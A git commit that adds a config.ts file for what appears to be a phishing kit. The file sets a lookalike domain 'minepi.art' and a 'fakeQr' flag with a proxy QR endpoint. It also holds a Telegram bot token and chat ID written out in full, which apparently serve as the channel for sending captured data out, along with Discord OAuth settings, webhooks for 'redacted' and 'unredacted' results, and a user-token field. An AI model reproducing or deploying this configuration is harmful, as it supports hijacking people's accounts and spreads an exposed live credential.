721ddb7922f703bb890abe2e1d7af4f8be67c7af
Seized User <164658008+SeizedAssets@users.noreply.github.com>
2025-10-22 15:05:58 -0700

    Add files via upload

---
+++ config.ts
@@ -0,0 +1,25 @@
+// SERVER DETAILS
+export const domain = 'minepi.art';
+export const fullDomain = `https://${domain}`;
+export const proxies: string[] = [];
+export const fakeQr = true;
+export const qrCodeEndpoint = 'localhost:8080/proxy';
+export const hostingOnVPS = false;
+
+// TELEGRAM DETAILS
+export const telegramToken = '8338922746:AAFjdNA6bjDdflVEmwczSvXWqmWvegGohKo';
+export const telegramChatId = '-1002875610920';
+
+// DISCORD OAUTH DETAILS
+export const clientID = '';
+export const clientSecret = '';
+export const redirectURI = `${fullDomain}/login`;
+
+// WEBHOOKS
+export const redactedWebhook = 'REDACTED_HOOK';
+export const unredactedWebhook = 'UNREDACTED_HOOK';
+
+// AUTO ROLE
+export const autoRoleToken = 'USER_TOKEN';
+export const autoRoleGuildId = 'SERVER_ID';
+export const autoRoleRoleId = 'ROLE_ID';
